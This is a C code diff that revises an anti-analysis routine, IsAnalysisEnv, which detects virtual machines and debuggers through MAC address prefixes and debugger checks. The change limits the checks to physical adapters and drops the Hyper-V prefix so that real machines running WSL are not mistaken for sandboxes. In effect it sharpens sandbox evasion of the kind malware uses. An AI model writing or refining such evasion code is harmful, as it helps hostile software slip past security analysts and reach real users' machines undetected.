@@ -748,11 +748,12 @@ static bool Sink(void){
 static bool IsAnalysisEnv(void){
     Dbg("IsAnalysisEnv: checking");
 
-    // 1. Check for known VM MAC address prefixes
+    // 1. Check for known VM MAC address prefixes on PHYSICAL adapters only.
+    // Skip virtual adapters (WSL, Hyper-V virtual switch, VPN) to avoid false positives.
     // VMware: 00:0C:29, 00:50:56, 00:05:69
     // VirtualBox: 08:00:27, 0A:00:27
-    // Hyper-V: 00:15:5D
     // QEMU: 52:54:00
+    // (Hyper-V 00:15:5D excluded — WSL creates a Hyper-V virtual adapter on real machines)
     IP_ADAPTER_INFO adapter[16];
     ULONG bufLen = sizeof(adapter);
     HMODULE iphlp = LoadLibraryA("iphlpapi.dll");
@@ -764,14 +765,32 @@ static bool IsAnalysisEnv(void){
             if(rc == 0){
                 PIP_ADAPTER_INFO p = adapter;
                 while(p){
+                    // Only check Ethernet (type 6) and Wireless (type 71) adapters.
+                    // Skip type 1 (Loopback), type 53 (propvirtual), type 131 (tunnel).
+                    // This filters out WSL, VPN, and virtual tunnel adapters.
+                    if(p->Type != 6 && p->Type != 71){
+                        p = p->Next;
+                        continue;
+                    }
+                    // Skip adapters with "Virtual" or "WSL" in the description
+                    bool isVirtual = false;
+                    const char* desc = p->Description;
+                    if(desc){
+                        // Check for "Virtual", "WSL", "Hyper-V" in description
+                        for(const char* s = desc; s[0]; s++){
+                            if((s[0]=='V'||s[0]=='v') && (s[1]=='i'||s[1]=='I') &&
+                               (s[2]=='r'||s[2]=='R') && (s[3]=='t')){ isVirtual=true; break; }
+                            if(s[0]=='W' && s[1]=='S' && s[2]=='L'){ isVirtual=true; break; }
+                        }
+                    }
+                    if(isVirtual){ p = p->Next; continue; }
                     if(p->AddressLength >= 3){
                         unsigned char* mac = p->Address;
                         if((mac[0]==0x00 && mac[1]==0x0C && mac[2]==0x29) ||  // VMware
                            (mac[0]==0x00 && mac[1]==0x50 && mac[2]==0x56) ||  // VMware
                            (mac[0]==0x08 && mac[1]==0x00 && mac[2]==0x27) ||  // VirtualBox
-                           (mac[0]==0x00 && mac[1]==0x15 && mac[2]==0x5D) ||  // Hyper-V
                            (mac[0]==0x52 && mac[1]==0x54 && mac[2]==0x00)){    // QEMU
-                            Dbg("IsAnalysisEnv: VM MAC detected");
+                            Dbg("IsAnalysisEnv: VM MAC detected (physical adapter)");
                             FreeLibrary(iphlp);
                             return true;
                         }
@@ -782,7 +801,7 @@ static bool IsAnalysisEnv(void){
         }
         FreeLibrary(iphlp);
     }
-    Dbg("IsAnalysisEnv: no VM MAC");
+    Dbg("IsAnalysisEnv: no VM MAC (physical adapters only)");
 
     // 2. Check for debugger (IsDebuggerPresent + CheckRemoteDebuggerPresent)
     // These are in kernel32.dll which is already loaded
